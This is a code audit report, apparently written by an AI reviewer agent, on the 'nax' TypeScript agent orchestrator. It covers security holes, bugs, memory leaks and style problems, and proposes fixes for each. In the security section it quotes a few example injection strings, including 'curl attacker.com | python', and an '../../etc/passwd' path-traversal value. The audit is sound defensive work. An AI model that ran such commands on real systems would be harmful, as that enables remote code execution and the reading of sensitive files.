# NAX Codebase Audit -- 2026-02-28

**Auditor:** Claude Opus 4.6 (code-reviewer agent)
**Scope:** Full src/ directory -- 27,333 lines across 130 TypeScript files
**Verdict:** Grade C- (Conditional Pass with Mandatory Fixes)

---

## Executive Summary

nax is a well-architected AI agent orchestrator with solid domain modeling
(pipeline stages, routing strategies, plugin system). The Zod-validated
config, path-security module, and structured error classes show mature
engineering judgment. However, several critical issues must be resolved
before any production release:

1. **`--dangerously-skip-permissions` is hardcoded** in the agent adapter,
   bypassing all safety controls in every execution.
2. **runner.ts at 1,685 lines** is a maintenance hazard -- duplicated logic
   with story-dispatcher.ts creates divergence risk.
3. **Crash handler captures stale closure values** for cost/iterations,
   meaning crash status files will contain incorrect data.
4. **Lock file has a TOCTOU race** between checking existence and writing.
5. **LLM routing cache is a module-level Map** with no size limit, growing
   unboundedly across stories.

---

## Findings

### SECURITY

```
[SEC-1] CRITICAL -- Hardcoded --dangerously-skip-permissions
File: /Users/subrinaai/Desktop/workspace/subrina-coder/projects/nax/repos/nax/src/agents/claude.ts:140
Issue: Every agent invocation passes --dangerously-skip-permissions to
       Claude Code CLI. This disables all permission prompts and safety
       checks. The flag is not configurable -- it is hardcoded into
       buildCommand().
Fix:   Make this configurable via NaxConfig. Default to a safer mode
       (e.g., --permission-mode allowedTools) and only allow
       --dangerously-skip-permissions via explicit opt-in in config.

       // Current (dangerous)
       return [this.binary, "--model", model, "--dangerously-skip-permissions", "-p", options.prompt];

       // Proposed
       const permFlag = options.dangerouslySkipPermissions
         ? "--dangerously-skip-permissions"
         : "--permission-mode";
       return [this.binary, "--model", model, permFlag, "-p", options.prompt];
```

```
[SEC-2] HIGH -- Plugin loader executes arbitrary code via dynamic import
File: /Users/subrinaai/Desktop/workspace/subrina-coder/projects/nax/repos/nax/src/plugins/loader.ts:203
Issue: loadAndValidatePlugin() calls `await import(modulePath)` on
       user-provided paths from config.plugins[].module. While the
       validator checks the plugin shape AFTER import, the import itself
       executes top-level module code unconditionally. A malicious plugin
       module can run arbitrary code at import time.
Fix:   Document the security boundary clearly. Consider sandboxing plugin
       imports or at minimum validating the path is within expected
       directories before importing. Add a "trusted plugins" allowlist.
```

```
[SEC-3] HIGH -- Hook commands are not fully sandboxed
File: /Users/subrinaai/Desktop/workspace/subrina-coder/projects/nax/repos/nax/src/hooks/runner.ts:120-136
Issue: validateHookCommand() rejects only a small set of patterns ($(..),
       backticks, rm -rf). Sophisticated injection is still possible:
       - eval "malicious code"
       - curl attacker.com | python
       - python -c "import os; os.system('...')"
       The parseCommandToArgv() function splits on whitespace, which does
       not properly handle quoted arguments (e.g., commands with spaces in
       file paths will break).
Fix:   Use a proper command parser or restrict hooks to a predefined set
       of allowed commands/binaries. Consider using an allowlist approach
       rather than a blocklist.
```

```
[SEC-4] MEDIUM -- Environment variable leakage to spawned agents
File: /Users/subrinaai/Desktop/workspace/subrina-coder/projects/nax/repos/nax/src/agents/claude.ts:226-229
Issue: The agent process inherits the full process.env via spread
       operator. This could leak sensitive environment variables (database
       credentials, API keys from other services) to the spawned claude
       process and any code it generates/executes.
Fix:   Create an explicit allowlist of environment variables to pass
       through, rather than passing all of process.env.
```

```
[SEC-5] MEDIUM -- No path validation on constitution/hook file paths
File: /Users/subrinaai/Desktop/workspace/subrina-coder/projects/nax/repos/nax/src/constitution/loader.ts:77-88
Issue: Constitution paths are joined from config without validation
       against the path-security module. A config with
       constitution.path = "../../etc/passwd" could read arbitrary files.
       The path-security module exists but is not used here.
Fix:   Use validateFilePath() from path-security.ts before reading
       constitution files.
```

### BUGS

```
[BUG-1] CRITICAL -- Crash handler captures stale cost/iteration values
File: /Users/subrinaai/Desktop/workspace/subrina-coder/projects/nax/repos/nax/src/execution/runner.ts:216-222
Issue: installCrashHandlers() receives ctx.totalCost and ctx.iterations
       as VALUES, not closures. The signal handler will always write the
       initial values (0 and 0) to the crash status, regardless of how
       far the run progressed.

       installCrashHandlers({
         statusWriter,
         totalCost,     // <-- captured as 0 at installation time
         iterations,    // <-- captured as 0 at installation time
         ...
       });

       Compare with startHeartbeat() which correctly uses closure getters:
         () => totalCost,
         () => iterations,

Fix:   Pass closures instead of values:
       installCrashHandlers({
         statusWriter,
         get totalCost() { return totalCost; },
         get iterations() { return iterations; },
         ...
       });
       Or refactor CrashRecoveryContext to accept getter functions.
```

```
[BUG-2] HIGH -- TOCTOU race in lock file acquisition
File: /Users/subrinaai/Desktop/workspace/subrina-coder/projects/nax/repos/nax/src/execution/helpers.ts:311-346
Issue: acquireLock() checks if the lock file exists, then writes it.
       Between the check and write, another process can also check and
       find no lock, leading to two processes both believing they
       acquired the lock. The lock mechanism uses Bun.write which is
       not atomic.
Fix:   Use an atomic file creation approach:
       - On POSIX: use O_CREAT | O_EXCL flags (exclusive create)
       - Or use a proper advisory lock (flock/lockfile)
       - Or use mkdir as a lock (mkdir is atomic on most filesystems)
```

```
[BUG-3] HIGH -- Massive code duplication between runner.ts and story-dispatcher.ts
File: /Users/subrinaai/Desktop/workspace/subrina-coder/projects/nax/repos/nax/src/execution/runner.ts
File: /Users/subrinaai/Desktop/workspace/subrina-coder/projects/nax/repos/nax/src/execution/story-dispatcher.ts
Issue: story-dispatcher.ts contains 765 lines that duplicate nearly all
       the logic in runner.ts. Both files define:
       - applyCachedRouting() (identical)
       - tryLlmBatchRoute() (identical)
       - resolveMaxAttemptsOutcome() (identical)
       - The entire escalation/pause/fail/skip switch-case logic
       However, runner.ts has additional features (S5 greenfield-no-tests
       test-after fallback, BUG-011 tier reset) that story-dispatcher.ts
       lacks. This divergence means fixes applied to one file are missed
       in the other.
Fix:   Delete story-dispatcher.ts or complete the extraction. runner.ts
       should call into shared functions. The current state is the worst
       of both worlds: duplicated code with subtle differences.
```

```
[BUG-4] HIGH -- Parallel execution concurrency limiter is broken
File: /Users/subrinaai/Desktop/workspace/subrina-coder/projects/nax/repos/nax/src/execution/parallel.ts:218-221
Issue: The concurrency limiter uses Promise.race(executing) but never
       removes resolved promises from the executing array. This means:
       1. The array grows unboundedly
       2. Promise.race will always resolve immediately after the first
          task completes (already-resolved promises resolve immediately)
       3. The concurrency limit is effectively not enforced after the
          first batch
Fix:   Track executing promises properly:
       - Remove completed promises from the array
       - Use a semaphore pattern or p-limit library
```

```
[BUG-5] MEDIUM -- getAllReadyStories does not filter "failed" or "paused" stories
File: /Users/subrinaai/Desktop/workspace/subrina-coder/projects/nax/repos/nax/src/execution/helpers.ts:259-265
Issue: The function only filters by !s.passes and s.status !== "skipped".
       Stories with status "failed", "paused", or "blocked" are included
       in the "ready" list, meaning they will be retried even if they
       should be skipped.
Fix:   Add explicit status checks:
       s.status !== "failed" && s.status !== "paused" && s.status !== "blocked"
```

```
[BUG-6] MEDIUM -- LLM routing callLlm reads stdout before waiting for exit
File: /Users/subrinaai/Desktop/workspace/subrina-coder/projects/nax/repos/nax/src/routing/strategies/llm.ts:147-156
Issue: The outputPromise reads stdout/stderr AND awaits proc.exited.
       But reading streams before the process exits may return incomplete
       data if the process is still writing. Additionally, the timeout
       kills the process but does not drain its streams, potentially
       causing the outputPromise to hang (same Bun stream bug documented
       in verification.ts).
Fix:   Use the same drainWithDeadline() pattern from verification.ts
       for the timeout path.
```

```
[BUG-7] MEDIUM -- PRD mutation in acceptance retry loop
File: /Users/subrinaai/Desktop/workspace/subrina-coder/projects/nax/repos/nax/src/execution/runner.ts:1472
Issue: prd.userStories.push(userStory) directly mutates the PRD array.
       This violates the project's immutability rules from CLAUDE.md.
       The mutated array is later saved, so there's no data loss, but
       mutation can cause unexpected behavior if other code holds
       references to the original array.
Fix:   prd = { ...prd, userStories: [...prd.userStories, userStory] };
```

```
[BUG-8] LOW -- releaseLock spawns external rm process
File: /Users/subrinaai/Desktop/workspace/subrina-coder/projects/nax/repos/nax/src/execution/helpers.ts:369
Issue: releaseLock() spawns `rm` as a subprocess instead of using
       Bun.file or fs.unlink. This is unnecessary overhead and may
       fail on systems where rm is not at the expected path.
Fix:   Use import("node:fs/promises").unlink(lockPath) or
       Bun.write(lockPath, "") followed by unlink.
```

### PERFORMANCE

```
[PERF-1] HIGH -- LLM routing cache has no size limit
File: /Users/subrinaai/Desktop/workspace/subrina-coder/projects/nax/repos/nax/src/routing/strategies/llm.ts:16
Issue: const cachedDecisions = new Map<string, RoutingDecision>();
       This module-level cache grows without bound. For large features
       with hundreds of stories (maxStoriesPerFeature=500), this could
       hold significant memory. Since the cache is never cleared between
       runs in long-lived processes, it could also serve stale decisions.
Fix:   Add a maximum cache size (LRU) or clear the cache at run
       boundaries (which clearCache() does, but only if called).
```

```
[PERF-2] MEDIUM -- PidRegistry rewrites entire file on every unregister
File: /Users/subrinaai/Desktop/workspace/subrina-coder/projects/nax/repos/nax/src/execution/pid-registry.ts:104-117
Issue: Every unregister() call reads, reconstructs, and rewrites the
       entire .nax-pids file. For sessions with many spawned processes
       (TDD = 3 processes per story x N stories), this is O(n) I/O
       per unregistration.
Fix:   Use an append-only format with periodic compaction, or just
       maintain the in-memory set and write the file only on
       shutdown/crash.
```

```
[PERF-3] MEDIUM -- redundant double-logging in runner.ts main loop
File: /Users/subrinaai/Desktop/workspace/subrina-coder/projects/nax/repos/nax/src/execution/runner.ts:780-798
Issue: Two consecutive logger.info calls log nearly identical
       information for "Starting iteration":
       - logger.info("execution", `Starting iteration ${iterations}`, ...)
       - logger.info("iteration.start", `Starting iteration ${iterations}`, ...)
       These produce duplicate log entries with overlapping data.
Fix:   Remove the first call -- the "iteration.start" entry is more
       complete and follows the structured logging convention.
```

```
[PERF-4] LOW -- Dynamic import() in hot paths
File: /Users/subrinaai/Desktop/workspace/subrina-coder/projects/nax/repos/nax/src/execution/runner.ts:246-254
File: /Users/subrinaai/Desktop/workspace/subrina-coder/projects/nax/repos/nax/src/execution/crash-recovery.ts:64,214
Issue: Several hot-path functions use `await import("node:fs")` instead
       of top-level imports. While Bun caches module resolutions, the
       async overhead is unnecessary for built-in modules.
Fix:   Move these to top-level imports.
```

### TYPE SAFETY

```
[TYPE-1] HIGH -- Unsafe `as any` cast in story-dispatcher.ts
File: /Users/subrinaai/Desktop/workspace/subrina-coder/projects/nax/repos/nax/src/execution/story-dispatcher.ts:104
Issue: overrides.modelTier = (config.autoMode.complexityRouting[story.routing.complexity] ?? "balanced") as any;
       The `as any` cast silences the type checker entirely and could
       mask legitimate type errors.
Fix:   Use `as ModelTier` or add a proper type assertion.
```

```
[TYPE-2] HIGH -- Unsafe `as any` cast in execution stage
File: /Users/subrinaai/Desktop/workspace/subrina-coder/projects/nax/repos/nax/src/pipeline/stages/execution.ts:103
Issue: (ctx.config.tdd as any)?.enabled === false
       This accesses a property that may not exist on the TddConfig type.
       If the type does not have an `enabled` field, this check is
       misleading and should be removed or the type should be updated.
Fix:   Add `enabled` to TddConfig interface or remove this dead code
       path.
```

```
[TYPE-3] MEDIUM -- Loose ModelTier = string type
File: /Users/subrinaai/Desktop/workspace/subrina-coder/projects/nax/repos/nax/src/config/schema.ts:25
Issue: export type ModelTier = string;
       This makes ModelTier equivalent to string, providing no type
       safety. Any string is accepted as a model tier, and the compiler
       cannot catch typos like "balacned" or "powerfull".
Fix:   Use a union type or branded type:
       type ModelTier = "fast" | "balanced" | "powerful" | (string & {});
       The intersection with {} preserves extensibility while providing
       autocomplete for known values.
```

```
[TYPE-4] MEDIUM -- Multiple `parsed: any` in LLM response parsing
File: /Users/subrinaai/Desktop/workspace/subrina-coder/projects/nax/repos/nax/src/agents/claude.ts:594
File: /Users/subrinaai/Desktop/workspace/subrina-coder/projects/nax/repos/nax/src/routing/strategies/llm.ts:234
Issue: JSON.parse results are typed as `any` and accessed without
       type guards. While runtime validation follows, the gap between
       parse and validate is untyped.
Fix:   Use `unknown` instead of `any` and add type narrowing before
       property access:
       const parsed: unknown = JSON.parse(jsonText);
       if (!isObject(parsed)) throw new Error("...");
```

```
[TYPE-5] LOW -- OptimizerConfigSchema mismatch with OptimizerConfig interface
File: /Users/subrinaai/Desktop/workspace/subrina-coder/projects/nax/repos/nax/src/config/schema.ts:622-625
Issue: The Zod schema defines strategy as z.enum(["cost", "quality", "balanced"])
       but the OptimizerConfig interface defines it as
       "rule-based" | "llm" | "noop". These enums do not match.
Fix:   Align the Zod schema with the interface.
```

### MEMORY

```
[MEM-1] HIGH -- Crash handlers never unregister process listeners
File: /Users/subrinaai/Desktop/workspace/subrina-coder/projects/nax/repos/nax/src/execution/crash-recovery.ts:124-177
Issue: installCrashHandlers() adds listeners for SIGTERM, SIGINT,
       SIGHUP, uncaughtException, and unhandledRejection but never
       removes them. The handlersInstalled flag prevents duplicate
       installation, but if nax is used as a library, old handlers
       from previous runs will accumulate. The handlers also capture
       the CrashRecoveryContext in closure, preventing garbage
       collection of statusWriter, pidRegistry, etc.
Fix:   Return a cleanup function from installCrashHandlers() that
       removes all listeners. Call it in the finally block.
```

```
[MEM-2] MEDIUM -- pidRegistries Map in ClaudeCodeAdapter never cleans up
File: /Users/subrinaai/Desktop/workspace/subrina-coder/projects/nax/repos/nax/src/agents/claude.ts:78
Issue: private pidRegistries: Map<string, PidRegistry> = new Map();
       Each workdir gets a PidRegistry that is never removed. If the
       adapter is long-lived (e.g., in a daemon/server context), this
       leaks PidRegistry instances.
Fix:   Add a cleanup method or use WeakRef/FinalizationRegistry.
```

```
[MEM-3] MEDIUM -- allStoryMetrics array grows unboundedly during acceptance loop
File: /Users/subrinaai/Desktop/workspace/subrina-coder/projects/nax/repos/nax/src/execution/runner.ts:1537
Issue: Fix story metrics are pushed into allStoryMetrics during the
       acceptance retry loop. With maxRetries=2 and multiple fix stories,
       this array grows without bound. Combined with maxStoriesPerFeature
       =500, this could be significant.
Fix:   Cap allStoryMetrics or remove entries for superseded fix stories.
```

### ERROR HANDLING

```
[ERR-1] HIGH -- Silent error swallowing in plugin loader
File: /Users/subrinaai/Desktop/workspace/subrina-coder/projects/nax/repos/nax/src/plugins/loader.ts:148-151
Issue: discoverPlugins() catches all errors and returns []. This means
       permission errors, disk failures, or other critical I/O issues
       are silently ignored. The caller has no way to distinguish
       "no plugins found" from "failed to read directory".
Fix:   Only catch ENOENT (directory not found). Re-throw other errors
       or return them as diagnostics.
```

```
[ERR-2] MEDIUM -- Console.warn used instead of structured logger
File: /Users/subrinaai/Desktop/workspace/subrina-coder/projects/nax/repos/nax/src/plugins/loader.ts:63,79,96
File: /Users/subrinaai/Desktop/workspace/subrina-coder/projects/nax/repos/nax/src/plugins/validator.ts:30-290
Issue: Plugin loader and validator use console.warn/console.error
       throughout instead of the structured logger (getLogger()). This
       bypasses log filtering, structured output, and JSONL logging.
       The validator has 20+ console.warn calls.
Fix:   Use getSafeLogger() for all warning/error output. Fall back to
       console only if logger is unavailable.
```

```
[ERR-3] MEDIUM -- Empty catch blocks hide failures
File: /Users/subrinaai/Desktop/workspace/subrina-coder/projects/nax/repos/nax/src/agents/claude.ts:111,383
File: /Users/subrinaai/Desktop/workspace/subrina-coder/projects/nax/repos/nax/src/execution/verification.ts:38,168,185
Issue: Multiple catch blocks are completely empty:
       } catch {}
       These silently swallow errors with no logging. Even transient
       errors that "should never happen" deserve a debug log entry.
Fix:   Add at minimum a debug-level log in each catch block.
```

```
[ERR-4] LOW -- buildStoryContext uses process.cwd() instead of workdir
File: /Users/subrinaai/Desktop/workspace/subrina-coder/projects/nax/repos/nax/src/execution/helpers.ts:177
Issue: workdir: process.cwd() is used instead of the workdir from config.
       In parallel execution mode, process.cwd() may not match the
       story's worktree directory, causing context to be built from the
       wrong directory.
Fix:   Accept workdir as a parameter and pass it through from
       PipelineContext.
```

### CODE PATTERNS / STYLE

```
[STYLE-1] CRITICAL -- runner.ts is 1,685 lines (4x the 400-line guideline)
File: /Users/subrinaai/Desktop/workspace/subrina-coder/projects/nax/repos/nax/src/execution/runner.ts
Issue: The run() function alone spans 1,500+ lines. It contains:
       - Sequential execution loop (~350 lines)
       - Parallel execution path (~150 lines)
       - Acceptance retry loop (~200 lines)
       - Reporter notification boilerplate (~100 lines, copy-pasted 5x)
       - Status writer updates (~50 lines, copy-pasted 4x)
       - Headless output formatting (~50 lines, copy-pasted 2x)
       This violates the project's "max ~400 lines per file" rule.
Fix:   Extract into focused modules:
       - sequential-executor.ts (main loop)
       - acceptance-loop.ts (acceptance retry logic)
       - reporter-notifier.ts (reporter event emission)
       - headless-formatter.ts (console output for headless mode)
```

```
[STYLE-2] HIGH -- Reporter notification code duplicated 5+ times
File: /Users/subrinaai/Desktop/workspace/subrina-coder/projects/nax/repos/nax/src/execution/runner.ts:846-863,967-983,1025-1041,1055-1071,1101-1117
Issue: The pattern:
       for (const reporter of reporters) {
         if (reporter.onStoryComplete) {
           try {
             await reporter.onStoryComplete({ ... });
           } catch (error) {
             logger?.warn("plugins", `Reporter '${reporter.name}' ...`, { error });
           }
         }
       }
       is copy-pasted 5+ times with slightly different event data.
Fix:   Extract a notifyReporters() helper:
       async function notifyReporters(reporters, event, data) { ... }
```

```
[STYLE-3] MEDIUM -- console.error/console.log in non-CLI code
File: /Users/subrinaai/Desktop/workspace/subrina-coder/projects/nax/repos/nax/src/execution/runner.ts:284-292
Issue: Direct console.error() calls in the runner for precheck output.
       These bypass the structured logging system and cannot be
       captured in JSONL logs.
Fix:   Use the logger for all output. Use the formatter for headless
       mode display.
```

```
[STYLE-4] MEDIUM -- Emojis in log messages and code
File: /Users/subrinaai/Desktop/workspace/subrina-coder/projects/nax/repos/nax/src/tdd/orchestrator.ts:292,347,388,669
File: /Users/subrinaai/Desktop/workspace/subrina-coder/projects/nax/repos/nax/src/execution/helpers.ts:434
Issue: Log messages contain emojis (checkmark, warning, arrows, chart):
       "Three-Session TDD"
       "Test writer session failed"
       "Created test files"
       "Progress: 6/12 stories | 5 passed | 1 failed"
       Per CLAUDE.md: "No emojis in code, comments, or documentation"
Fix:   Remove all emojis from logger messages. Use text indicators:
       "[OK]", "[WARN]", "[FAIL]", "->", etc.
```

```
[STYLE-5] LOW -- Inconsistent require() vs import
File: /Users/subrinaai/Desktop/workspace/subrina-coder/projects/nax/repos/nax/src/agents/claude.ts:348-350,413
Issue: Uses require("node:path") and require("node:fs") inline instead
       of ES module imports. The rest of the codebase uses ES imports.
Fix:   Move to top-level ES module imports for consistency.
```

```
[STYLE-6] LOW -- Dead code: unused maxConcurrency variable
File: /Users/subrinaai/Desktop/workspace/subrina-coder/projects/nax/repos/nax/src/execution/runner.ts:196
Issue: const maxConcurrency = parallel === 0 ? (os.cpus().length || 4) : (parallel ?? 0);
       This variable is declared on line 196 but shadowed by a new
       declaration on line 459 inside the parallel execution block.
       The outer variable is never used.
Fix:   Remove the unused declaration on line 196.
```

---

## Priority Matrix

| ID | Severity | Category | File | Description |
|:---|:---------|:---------|:-----|:------------|
| SEC-1 | CRITICAL | Security | agents/claude.ts:140 | Hardcoded --dangerously-skip-permissions |
| BUG-1 | CRITICAL | Bug | execution/runner.ts:216 | Crash handler captures stale values |
| STYLE-1 | CRITICAL | Style | execution/runner.ts | 1,685-line file (4x guideline max) |
| BUG-3 | HIGH | Bug | execution/runner.ts + story-dispatcher.ts | 765 lines of duplicated logic with divergence |
| BUG-4 | HIGH | Bug | execution/parallel.ts:218 | Broken concurrency limiter |
| SEC-2 | HIGH | Security | plugins/loader.ts:203 | Arbitrary code execution via plugin import |
| SEC-3 | HIGH | Security | hooks/runner.ts:120 | Incomplete command injection prevention |
| BUG-2 | HIGH | Bug | execution/helpers.ts:311 | TOCTOU race in lock acquisition |
| PERF-1 | HIGH | Performance | routing/strategies/llm.ts:16 | Unbounded LLM routing cache |
| MEM-1 | HIGH | Memory | execution/crash-recovery.ts:124 | Process listeners never unregistered |
| TYPE-1 | HIGH | Type Safety | execution/story-dispatcher.ts:104 | Unsafe `as any` cast |
| TYPE-2 | HIGH | Type Safety | pipeline/stages/execution.ts:103 | Unsafe `as any` cast |
| ERR-1 | HIGH | Error Handling | plugins/loader.ts:148 | Silent error swallowing |
| STYLE-2 | HIGH | Style | execution/runner.ts | Reporter code duplicated 5x |
| SEC-4 | MEDIUM | Security | agents/claude.ts:226 | Env variable leakage to agent |
| SEC-5 | MEDIUM | Security | constitution/loader.ts:77 | Missing path validation |
| BUG-5 | MEDIUM | Bug | execution/helpers.ts:259 | Ready stories includes failed/paused |
| BUG-6 | MEDIUM | Bug | routing/strategies/llm.ts:147 | Stream read before process exit |
| BUG-7 | MEDIUM | Bug | execution/runner.ts:1472 | PRD array mutation |
| PERF-2 | MEDIUM | Performance | execution/pid-registry.ts:104 | O(n) file rewrite per unregister |
| PERF-3 | MEDIUM | Performance | execution/runner.ts:780 | Duplicate logging calls |
| TYPE-3 | MEDIUM | Type Safety | config/schema.ts:25 | ModelTier = string (no safety) |
| TYPE-4 | MEDIUM | Type Safety | agents/claude.ts:594 | JSON.parse returns any |
| MEM-2 | MEDIUM | Memory | agents/claude.ts:78 | PidRegistry map never cleaned |
| MEM-3 | MEDIUM | Memory | execution/runner.ts:1537 | Unbounded metrics array |
| ERR-2 | MEDIUM | Error Handling | plugins/loader.ts + validator.ts | console.warn instead of logger |
| ERR-3 | MEDIUM | Error Handling | multiple files | Empty catch blocks |
| STYLE-3 | MEDIUM | Style | execution/runner.ts:284 | console.error in non-CLI code |
| STYLE-4 | MEDIUM | Style | tdd/orchestrator.ts + helpers.ts | Emojis in log messages |
| ERR-4 | LOW | Error Handling | execution/helpers.ts:177 | process.cwd() instead of workdir |
| BUG-8 | LOW | Bug | execution/helpers.ts:369 | Spawns rm subprocess for file delete |
| TYPE-5 | LOW | Type Safety | config/schema.ts:622 | Schema/interface enum mismatch |
| PERF-4 | LOW | Performance | runner.ts, crash-recovery.ts | Dynamic import in hot paths |
| STYLE-5 | LOW | Style | agents/claude.ts:348 | require() instead of import |
| STYLE-6 | LOW | Style | execution/runner.ts:196 | Dead code: shadowed variable |

---

## Top 5 Fixes (Implement First)

### 1. Fix crash handler stale values (BUG-1)
**Why first:** Crash recovery is a safety-critical feature. Currently it
writes incorrect data on crash, making the feature worse than useless
(it provides false information). One-line fix with massive impact.

### 2. Make --dangerously-skip-permissions configurable (SEC-1)
**Why second:** This is the single most impactful security issue. Every
agent invocation bypasses all safety controls. Making it configurable
allows users to choose their security posture.

### 3. Fix parallel execution concurrency limiter (BUG-4)
**Why third:** The broken limiter means parallel mode can spawn unlimited
concurrent processes, causing resource exhaustion and potential system
instability.

### 4. Split runner.ts (STYLE-1 + STYLE-2 + BUG-3)
**Why fourth:** This addresses three findings at once. Extract the
reporter notification helper, the acceptance loop, and the sequential
execution loop. Delete story-dispatcher.ts to eliminate the divergence
risk.

### 5. Fix lock file TOCTOU race (BUG-2)
**Why fifth:** Concurrent nax processes can corrupt the PRD file and
waste money by running duplicate agent sessions. Using atomic file
creation prevents this.

---

## Positive Observations

Despite the issues above, the codebase demonstrates strong engineering:

1. **Zod validation for all config** -- config/schema.ts provides
   comprehensive runtime validation with clear error messages.
2. **Path security module** -- path-security.ts with symlink resolution
   and bounds checking shows security awareness.
3. **Structured error classes** -- errors.ts with typed codes enables
   proper error handling at the CLI boundary.
4. **Immutable patterns in most code** -- spread operators and map()
   used consistently (the PRD mutation in BUG-7 is the exception).
5. **Comprehensive TDD orchestrator** -- The three-session TDD pipeline
   with isolation verification, verdict parsing, and rollback is
   well-designed and thoroughly implemented.
6. **Plugin system architecture** -- Clean separation of concerns with
   typed extension points, runtime validation, and graceful fallbacks.
7. **ADR-003 verification flow** -- The multi-stage verification with
   environmental failure detection and smart exit-code analysis is
   production-quality infrastructure.

---

## Overall Grade: C-

**Justification:**

| Category | Score | Weight | Notes |
|:---------|:------|:-------|:------|
| Security | D | 25% | Hardcoded permission bypass, incomplete injection prevention |
| Correctness | C | 25% | Stale crash values, broken concurrency, TOCTOU race |
| Maintainability | D+ | 20% | 1685-line file, massive duplication, divergent copies |
| Type Safety | C+ | 10% | Good Zod usage undermined by `as any` casts |
| Performance | B- | 10% | Unbounded cache is the only real issue |
| Error Handling | C | 10% | Mix of good (structured errors) and bad (empty catches) |

The architecture and domain modeling are strong (B+), but the
implementation has accumulated technical debt that creates real risk.
The five critical/high findings (SEC-1, BUG-1, BUG-3, BUG-4, STYLE-1)
must be addressed before any production deployment.

**Approval:** BLOCKED -- 3 CRITICAL and 11 HIGH findings.
